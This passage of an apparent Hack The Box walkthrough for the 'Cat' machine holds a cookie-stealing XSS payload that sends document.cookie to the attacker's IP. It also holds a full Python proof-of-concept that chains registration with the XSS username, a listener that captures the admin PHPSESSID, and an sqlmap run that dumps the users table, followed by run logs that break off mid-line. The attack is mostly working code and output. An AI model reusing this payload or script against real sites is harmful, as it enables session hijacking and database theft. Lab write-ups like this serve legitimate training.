+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53/git$ git <span class="built_in">log</span></span><br><span class="line">commit 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 (HEAD -&gt; master)</span><br><span class="line">Author: Axel &lt;axel2017@gmail.com&gt;</span><br><span class="line">Date:   Sat Aug 31 23:26:14 2024 +0000</span><br><span class="line"></span><br><span class="line">    Cat v1</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Reflective-XSS"><a href="#Reflective-XSS" class="headerlink" title="Reflective XSS"></a>Reflective XSS</h2><ol>
+<li>Registering with XSS payload as the username</li>
+<li>submit a dummy file via <code>contest.php</code></li>
+<li>Host a python server</li>
+<li>wait for the XSS payload to reach back out</li>
+</ol>
+<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;http://10.10.14.119:8000/?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250205230332.png"
+                      width="250"
+                >
+
+
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250205230355.png"
+                      width="250"
+                >
+
+
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53$ python3 -m http.server 8000</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.11.53 - - [05/Feb/2025 23:03:44] <span class="string">&quot;GET /?cookie=PHPSESSID=806f6dr6sgvhqqegh5cral7821 HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure></div>
+
+<p>Using the poc.py</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="comment"># === Configuration ===</span></span><br><span class="line">TARGET_HOST = <span class="string">&quot;http://cat.htb&quot;</span></span><br><span class="line">ATTACKER_IP = <span class="string">&quot;10.10.14.119&quot;</span>  <span class="comment"># Change this</span></span><br><span class="line">ATTACKER_SERVER = <span class="string">f&quot;http://<span class="subst">&#123;ATTACKER_IP&#125;</span>&quot;</span></span><br><span class="line">SQLMAP_PATH = <span class="string">&quot;/usr/bin/sqlmap&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;abc123&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XSS Payload to steal admin&#x27;s PHPSESSID</span></span><br><span class="line">XSS_PAYLOAD = <span class="string">f&#x27;&lt;script&gt;fetch(&quot;<span class="subst">&#123;ATTACKER_SERVER&#125;</span>/?c=&quot;+encodeURIComponent(document.cookie));&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging Configuration</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s - %(levelname)s - %(message)s&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Global variable to store the leaked admin session</span></span><br><span class="line">admin_session_id = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># === Utility Functions ===</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr_debug</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function for debug logging.&quot;&quot;&quot;</span></span><br><span class="line">    logging.debug(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_user_agent</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate a random User-Agent for stealth.&quot;&quot;&quot;</span></span><br><span class="line">    agents = [</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/107.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> random.choice(agents)</span><br><span class="line"></span><br><span class="line"><span class="comment"># === HTTP Server to Capture PHPSESSID ===</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;HTTP Server to capture PHPSESSID.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> admin_session_id</span><br><span class="line"></span><br><span class="line">        parsed_path = urllib.parse.urlparse(<span class="variable language_">self</span>.path)</span><br><span class="line">        query_params = urllib.parse.parse_qs(parsed_path.query)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;c&quot;</span> <span class="keyword">in</span> query_params:</span><br><span class="line">            session_id = query_params[<span class="string">&quot;c&quot;</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;PHPSESSID=&quot;</span> <span class="keyword">in</span> session_id:</span><br><span class="line">                admin_session_id = session_id.replace(<span class="string">&quot;PHPSESSID=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                logging.info(<span class="string">f&quot;[+] Captured Admin PHPSESSID: <span class="subst">&#123;admin_session_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">        <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;OK&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_http_server</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Starts an HTTP server in a background thread.&quot;&quot;&quot;</span></span><br><span class="line">    server_address = (<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">80</span>)</span><br><span class="line">    httpd = HTTPServer(server_address, RequestHandler)</span><br><span class="line">    threading.Thread(target=httpd.serve_forever, daemon=<span class="literal">True</span>).start()</span><br><span class="line">    logging.info(<span class="string">&quot;[*] HTTP server started on port 80 to capture admin PHPSESSID...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># === Exploitation Functions ===</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_email</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate a unique email for registration.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;sqli<span class="subst">&#123;random.randint(<span class="number">1000</span>, <span class="number">9999</span>)&#125;</span>@muyi.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_new_account</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Registers a new account with XSS payload in the username.&quot;&quot;&quot;</span></span><br><span class="line">    email = generate_random_email()</span><br><span class="line">    encoded_email = urllib.parse.quote(email)</span><br><span class="line">    encoded_username = urllib.parse.quote(XSS_PAYLOAD)</span><br><span class="line">    register_url = <span class="string">f&quot;<span class="subst">&#123;TARGET_HOST&#125;</span>/join.php?username=<span class="subst">&#123;encoded_username&#125;</span>&amp;email=<span class="subst">&#123;encoded_email&#125;</span>&amp;password=<span class="subst">&#123;PASSWORD&#125;</span>&amp;registerForm=Register&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: random_user_agent()&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(register_url, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            logging.info(<span class="string">f&quot;[+] Registered new account with email: <span class="subst">&#123;email&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> email</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">f&quot;[-] Registration failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_and_get_cookie</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Logs in with the injected XSS username and returns PHPSESSID.&quot;&quot;&quot;</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_url = <span class="string">f&quot;<span class="subst">&#123;TARGET_HOST&#125;</span>/join.php?loginUsername=<span class="subst">&#123;urllib.parse.quote(XSS_PAYLOAD)&#125;</span>&amp;loginPassword=<span class="subst">&#123;PASSWORD&#125;</span>&amp;loginForm=Login&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: random_user_agent()&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.get(login_url, headers=headers, allow_redirects=<span class="literal">True</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        session_id = session.cookies.get(<span class="string">&quot;PHPSESSID&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> session_id:</span><br><span class="line">            logging.info(<span class="string">f&quot;[+] Logged in successfully. Captured PHPSESSID: <span class="subst">&#123;session_id&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> session, session_id</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">f&quot;[-] Login failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_cat_entry</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Submits a cat entry using the valid PHPSESSID.&quot;&quot;&quot;</span></span><br><span class="line">    contest_url = <span class="string">f&quot;<span class="subst">&#123;TARGET_HOST&#125;</span>/contest.php&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: random_user_agent()&#125;</span><br><span class="line">    files = &#123;<span class="string">&quot;cat_photo&quot;</span>: (<span class="string">&quot;test.jpg&quot;</span>, <span class="string">b&quot;GIF89a aaa\ntest&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;cat_name&quot;</span>: <span class="string">&quot;tom&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;birthdate&quot;</span>: <span class="string">&quot;2077-12-31&quot;</span>, <span class="string">&quot;weight&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(contest_url, headers=headers, files=files, data=data, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Cat has been successfully sent for inspection.&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            logging.info(<span class="string">&quot;[+] Cat entry submitted successfully!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">f&quot;[-] Submission failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait_for_admin_session</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Waits until the admin session ID is leaked via XSS.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> admin_session_id</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">&quot;[*] Waiting for admin session to be leaked...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):  <span class="comment"># Try for ~5 minutes</span></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> admin_session_id:</span><br><span class="line">            logging.info(<span class="string">f&quot;[+] Captured Admin PHPSESSID: <span class="subst">&#123;admin_session_id&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> admin_session_id</span><br><span class="line">        logging.info(<span class="string">f&quot;[*] Checking again... (Attempt <span class="subst">&#123;attempt+<span class="number">1</span>&#125;</span>/60)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    logging.error(<span class="string">&quot;[-] Failed to retrieve admin session.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_session</span>(<span class="params">session_id</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Checks if the admin session is still valid.&quot;&quot;&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;TARGET_HOST&#125;</span>/accept_cat.php&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">f&quot;PHPSESSID=<span class="subst">&#123;session_id&#125;</span>&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: random_user_agent()&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Access denied.&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            logging.error(<span class="string">&quot;[-] Admin session expired.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> requests.RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sqlmap</span>(<span class="params">admin_session</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Runs SQLMap using the admin PHPSESSID.&quot;&quot;&quot;</span></span><br><span class="line">    logging.info(<span class="string">f&quot;[*] Running SQLMap with Admin PHPSESSID: <span class="subst">&#123;admin_session&#125;</span>&quot;</span>)</span><br><span class="line">    sqlmap_command = [</span><br><span class="line">        SQLMAP_PATH,</span><br><span class="line">        <span class="string">&quot;-u&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;TARGET_HOST&#125;</span>/accept_cat.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--data&quot;</span>, <span class="string">&quot;catId=2077&amp;catName=Tom&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--cookie&quot;</span>, <span class="string">f&quot;PHPSESSID=<span class="subst">&#123;admin_session&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-p&quot;</span>, <span class="string">&quot;catName&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--dbms=SQLite&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--technique=B&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-T&quot;</span>, <span class="string">&quot;users&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--dump&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--no-cast&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--threads=5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--batch&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--level=5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--risk=3&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    subprocess.run(sqlmap_command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main attack execution loop.&quot;&quot;&quot;</span></span><br><span class="line">    start_http_server()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        logging.info(<span class="string">&quot;\n[*] Starting new attack cycle...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        email = register_new_account()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> email:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        session, session_id = login_and_get_cookie()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> submit_cat_entry(session):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        admin_session = wait_for_admin_session()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> admin_session:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> validate_session(admin_session):</span><br><span class="line">            run_sqlmap(admin_session)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53$ sudo ~/.venv/bin/python3 poc.py</span><br><span class="line">2025-02-05 23:32:13,518 - INFO - [*] HTTP server started on port 80 to capture admin PHPSESSID...</span><br><span class="line">2025-02-05 23:32:13,518 - INFO -</span><br><span class="line">[*] Starting new attack cycle...</span><br><span class="line">2025-02-05 23:32:13,553 - INFO - [+] Registered new account with email: sqli1577@muyi.com</span><br><span class="line">2025-02-05 23:32:13,597 - INFO - [+] Logged in successfully. Captured PHPSESSID: qcqh6unu20pinogjjo2ijooqse</span><br><span class="line">2025-02-05 23:32:13,676 - INFO - [+] Cat entry submitted successfully!</span><br><span class="line">2025-02-05 23:32:13,676 - INFO - [*] Waiting for admin session to be leaked...</span><br><span class="line">2025-02-05 23:32:18,677 - INFO - [*] Checking again... (Attempt 1/60)</span><br><span class="line">2025-02-05 23:32:18,914 - INFO - [+] Captured Admin PHPSESSID: q49pk8trhp798t9ji2uguotki7</span><br><span class="line">10.10.11.53 - - [05/Feb/2025 23:32:18] &quot;GET 